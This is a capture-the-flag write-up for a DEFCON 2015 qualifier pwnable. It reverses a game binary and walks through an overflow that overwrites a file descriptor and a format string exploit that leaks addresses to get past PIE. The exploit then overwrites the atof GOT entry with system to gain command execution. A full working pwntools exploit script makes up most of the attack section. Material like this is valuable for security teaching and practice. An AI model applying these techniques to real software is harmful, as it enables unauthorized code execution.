---
title: DEFCON CTF 2015 Quals -- wibbly-wobbly-timey-wimey
tags:
  - Python
  - C
  - DEFCON
  - CTF
  - Pwnable
  - format_string
  - PPC
categories:
  - write-ups
date: 2015-05-23 22:40:00
---
**Category:** Pwnable
**Points:** 2
> Wibbly Wobbly Timey Wimey
> Don't blink!
> wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me:2606

<!-- more -->

32 bit ELF, with **Partial RELRO**, **stack canary found**, **NX** & **PIE** enabled.  
First we'll have to play a game:

```
You(^V<>) must find your way to the TARDIS(T) by avoiding the angels(A).
Go through the exits(E) to get to the next room and continue your search.
But, most importantly, don't blink!
   012345678901234567890
00                    E
01                     
02  A                  
03               A     
04 A                   
05                     
06               A     
07                A    
08                     
09        V       A    
10                  A  
11                A    
12              A      
13                     
14       A      A      
15                     
16                     
17                     
18                     
19                     
Your move (w,a,s,d,q):
```

We'll have to control `V` with **wasd**, and the goal is to reach the `E` without being touched by those `A`s. In the final stage, `E` will be changed to `T`, and we'll win the game by reaching `T`. After we beat the game, it will ask us to input a `TARDIS KEY`. At this moment, teammate **yench** started writing a python script to beat the game, while me and other teammates try to figure out what is the `TARDIS KEY`.

We found the following C code:
```c
signed int sub_EB8()
{
  char buf; // [sp+16h] [bp-12h]@3
  char v2; // [sp+17h] [bp-11h]@9
  int v3; // [sp+18h] [bp-10h]@1
  int (*v4)(void); // [sp+1Ch] [bp-Ch]@1

  v3 = 10;
  printf("TARDIS KEY: ");
  fflush(stdout);
  v4 = sub_EB8;
  while ( v3 )
  {
    if ( isalnum(*(_BYTE *)v4 & 0x7F) )
    {
      if ( read(0, &buf, 1u) == 1 && buf != (*(_BYTE *)v4 & 0x7F) )
        return 1;
      --v3;
    }
    v4 = (int (*)(void))((char *)v4 + 1);
  }
  do
    v2 = getchar();
  while ( v2 != 10 && v2 != -1 );
  return 0;
}
```

So it looks like the `TARDIS KEY` is a 10-byte-long string, which every character is the machine code in `sub_EB8()`, and the machine code should be an **alpha-numeric character** after it does the `& 0x7F` operation. After we dump the machine code and wrote a script to extract the correct byte, we got the `TARDIS KEY` = `"UeSlhCAGEp"`.  

```
TARDIS KEY: UeSlhCAGEp
Welcome to the TARDIS!
Your options are: 
1. Turn on the console
2. Leave the TARDIS
Selection:
```  

Looks like it only gave us 2 options. But after we reverse the binary, we found that it actually has 3 options. 

```c
 if ( LOBYTE(dword_50B0[0]) == '3' ) //dword_50B0[0] == our input
 {
     if ( unk_50AC )
     {
        choice3();
     }
     else
     {
        puts("Invalid");
        fflush(stdout);
     }
 }
```

We'll have to make `unk_50AC` = 1. The only way to achieve this is to successfully turn on the TARDIS console:

```c
 if ( LOBYTE(dword_50B0[0]) == '1' )
 {
     LOBYTE(v4) = sub_E08();
     if ( v4 )
     {
         printf("The TARDIS console is online!");
         unk_50AC = 1;
         fflush(stdout);
     }
     else
     {
         printf("Access denied except between %s and %s\n", &v7, &v8);
         fflush(stdout);
     }
 }
```

The line `LOBYTE(v4) = sub_E08();` will do the following checking:

```c
BOOL sub_E08()
{
  return dword_50A4 > 1431907180 && dword_50A4 <= 1431907199;
}
```

and we can only write `dword_50A4` in function `sub_BCB()`:
```c
size_t sub_BCB()
{
  unsigned int v0; // eax@1
  size_t result; // eax@7
  int buf; // [sp+18h] [bp-10h]@5
  int v3; // [sp+1Ch] [bp-Ch]@5

  v0 = unk_50A8++;
  if ( v0 > 0xFFFFFFFF )
  {
    puts("\nUnauthorized occupant detected...goodbye");
    exit(-1);
  }
  if ( dword_50B0[2] == -1 )
  {
    result = fwrite("Time vortex not responding\n", 1u, 0x1Bu, stderr);
  }
  else
  {
    write(dword_50B0[2], &unk_2F4A, 1u);
    v3 = read(dword_50B0[2], &buf, 4u); // here
    if ( v3 == 4 )
      dword_50A4 = buf; //here
    result = alarm(2u);
  }
  return result;
}
```

Notice that `dword_50B0[2]` is the **fd**, and `dword_50B0[0]` is our **input buffer**(where the program store our **options**). By overflowing `dword_50B0[0]`, we can overwrite the value stored in `dword_50B0[2]` (the initial value is **3**, we'll have to overwrite it to **0**(`stdin`) so we can write our input into `dword_50A4`). 

To sum up, here are the steps for enabling the option 3:
1. Overwrite the **fd** (`dword_50B0[2]`) into **0** by overflowing `dword_50B0[0]`
2. Write the value into `dword_50A4` so it can pass the checking function `sub_E08()`. Notice that `sub_BCB()` is called by sending the `SIGALARM` signal, so be aware of the timing.
3. Select option **1**, for turning on the TARDIS console.
4. Option 3 will be enabled successfully after we turn on a TARDIS console.

Here's the payload:
```python
print t.recvuntil("Selection: ")
log.info("overwriting fd...")
t.send("11111111\x00\n") # overwrite fd into stdin
print t.recvuntil("Selection: ")
time.sleep(2) # wait for 2 second (until the service call sub_BCB())
log.info("enable choice 3...")
t.send("m+YU\n") # m+YU = 1431907181
t.send("1\n")    # turn on the TARDIS console
print t.recvuntil("Selection: ")
log.info("writing fd back...")
t.send("11111111\x03\n") # write the fd back
print t.recvuntil("Selection: ")
t.sendline("3")
t.recvuntil("Coordinates: ")
log.success("choice 3 enabled success")
```

After we successfully enable option 3, let's see what does it do: 
```c
int choice3()
{
  double v0; // ST28_8@6
  int result; // eax@9
  char *nptr; // [sp+24h] [bp-424h]@4
  double v3; // [sp+30h] [bp-418h]@6
  char s; // [sp+3Ch] [bp-40Ch]@2
  int v5; // [sp+43Ch] [bp-Ch]@1

  v5 = *MK_FP(__GS__, 20);
  while ( 1 )
  {
    while ( 1 )
    {
      printf("Coordinates: ");
      fflush(stdout);
      if ( sub_F7E(0, (int)&s, 1023, 10) == -1 ) // input coordinates
        exit(-1);
      nptr = strchr(&s, ','); // split with ','
      if ( nptr )
        break;
      puts("Invalid coordinates");
    }
    v0 = atof(&s);
    v3 = atof(nptr + 1);
    printf("%f, %f\n", v0, v3);
    if ( 51.492137 != v0 || -0.192878 != v3 )
      break;
    printf("Coordinate ");
    printf(&s); // format string vulnerability
    printf(" is occupied by another TARDIS.  Materializing there ");
    puts("would rip a hole in time and space. Choose again.");
    fflush(stdout);
  }
  printf("You safely travel to coordinates %s\n", &s);
  result = fflush(stdout);
  if ( *MK_FP(__GS__, 20) != v5 )
    terminate_proc();
  return result;
}
```

So it will let us input our coordinates, and check the coordinates' value. If the coordinates are **(51.492137, -0.192878)**, it will trigger the **format string vulnerability**. After leaking some messages, we found that we're able to leak the **stack address**. This is very important, since the binary has the **PIE** & **Partial RELRO** protection, we don't know where the text's base address is, neither functions' GOT address. But if we can leak the stack address, we can calculate the location that stored the return address, **and leak the return address to calculate the text's base address.** After we have the text's base address, we can **calculate the functions' GOT address, and leak the function pointer.** After we got all the memory address, we can use the format string vulnerability to overwrite `atof`'s GOT entry into `system`'s address, and execute our command by entering our commands as the coordinates.

So to sum up:
1. Leak the stack address and calculate the return address' location
2. Leak the return address and calculate the text's base address
3. Calculate `atof`'s GOT and leak the function pointer
4. Calculate `system`'s address and overwrite `atof`'s GOT entry
5. Input coordinates **"[command], [garbage]"** to execute our commands
    

Here's the exploit. The part that beating the game was done by **yench**, while the rest was done by me.

```python wwtw_exp.py
from pwn import *
import struct
import time
import binascii
import hashlib
import time
import string

ip = "wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me"
port = 2606

def getMap(s):
	MAP=s
	MAP=MAP[:len(MAP)-24]
	print MAP
	MAP=MAP[len(MAP)-479:]
	sql=MAP.split('\n')
	i=0
	res = [[] for x in range(20)] 
	for l in sql:
		l = l[3:]
		res[i]=l
		i+=1 
	return res

def getChar(c,MAP):
	x=0
	y=0
	for i in MAP:
		for j in i:
			for a in c:
				if j == a:
					return (y,x)
			y+=1
		x+=1
		y=0
	return (-1,-1)


t = remote(ip, port)

# start playing the game
for test in range(1000):
	s = t.readuntil(": ")
	if "KEY" in s:
		print s
		break
	MAP = getMap(s)
	GOAL=(-1,-1)
	ME=(-1,-1)
	GOAL=getChar(['E','T'],MAP)
	print GOAL
	ME=getChar(['<','>','V','^'],MAP)
	print ME

	drct = []
	if( ME[0] - GOAL[0] > 0 ):
		if( ME[0] > 0 and MAP[ME[1]][ME[0]-1] !='A'):
			drct+='a'
	elif( ME[0] - GOAL[0] < 0 ):
		if( ME[0] < 19 and MAP[ME[1]][ME[0]+1] !='A'):
			drct+='d'
	if( ME[1] - GOAL[1] > 0 ):
		if( ME[1] > 0 and MAP[ME[1]-1][ME[0]] !='A'):
			drct+='w'
	elif( ME[1] - GOAL[1] < 0 ):
		if( ME[1] < 19 and MAP[ME[1]+1][ME[0]] !='A'):
			drct+='s'
	if drct == [] :
		if ME[0] == GOAL[0] :
			if ME[0] > 0 :
				drct+='a'
			else:
				drct+='d'
		elif ME[1] == GOAL[1] :
			if ME[1] > 0 :
				drct+='w'
			else:
				drct+='s'
			
	print drct
	t.send(drct[0]+'\n')

# Done playing, time to send TARDIS KEY

log.info("sending tardis key...")
t.send("UeSlhCAGEp\n")
print t.recvuntil("Selection: ")
log.info("overwriting fd...")
t.send("11111111\x00\n")
print t.recvuntil("Selection: ")
time.sleep(2) # wait for 2 second so the service's able to call sub_BCB()
log.info("enable choice 3...")
t.send("m+YU\n") # m+YU = 1431907181
t.send("1\n") # turn on the TARDIS console
print t.recvuntil("Selection: ")
log.info("writing fd back...")
t.send("11111111\x03\n") # write the fd back to 3 so the rest of our input won't get into sub_BCB()
print t.recvuntil("Selection: ")
t.sendline("3")
t.recvuntil("Coordinates: ")
log.success("choice 3 enabled success")

x = 51.492137
y = -0.192878
pass_xy = str(x)+','+str(y)

payload = pass_xy

# constructing format string payload
for i in xrange(1, 20):
    a = ".%"+str(i)+"$p"
    payload += a

log.info("sending payload...")
t.sendline(payload)
s = t.recvuntil("Coordinates: ")
print s
nptr = int(s.split(".")[13], 16) # get the stack address
ret_addr = nptr + 0x406 # return address' location

log.success("nptr: "+ hex(nptr))
log.success("ret: "+ hex(ret_addr))

payload = pass_xy
payload += "A" # padding
payload += p32(ret_addr)
payload += ".%20$p"
payload += ".%20$s." # leak the return address
t.sendline(payload)

s = t.recvuntil("Coordinates: ")
print s
WTF = u32(s.split(".")[6]) # return address
text_base = WTF - 0x1491
atof_got = text_base + 0x5080
log.success("text_base: "+ hex(text_base))
log.success("atof_got: "+ hex(atof_got))

payload = pass_xy
payload += "A"
payload += p32(atof_got)
payload += ".%20$p"
payload += ".%20$s."  # leak atof's got
t.sendline(payload)

s = t.recvuntil("Coordinates: ")
print s
atof_addr = u32(s.split(".")[6][0:4])
system_addr = atof_addr + 59728
log.success("atof addres: "+ hex(atof_addr))
log.success("system addres: "+ hex(system_addr))

byte1 = system_addr & 0xFF
byte2 = (system_addr & 0xFFFF00) >> 8

# use %n to overwrite atof's got entry into system's address
fmt1 = byte1 - 28
fmt2 = byte2 - fmt1 - 28
payload = pass_xy
payload += "A"
payload += p32(atof_got)
payload += p32(atof_got+1)
payload += "%"+str(fmt1)+"c"+"%20$hhn"
payload += "%"+str(fmt2)+"c%21$hn"
t.sendline(payload)
s = t.recvuntil("Coordinates: ")
print s

t.interactive()
# send cat /home/wwtw/flag;,123 to get flag

```

Flag: `Would you like a Jelly Baby? !@()*ASF)9UW$askjal`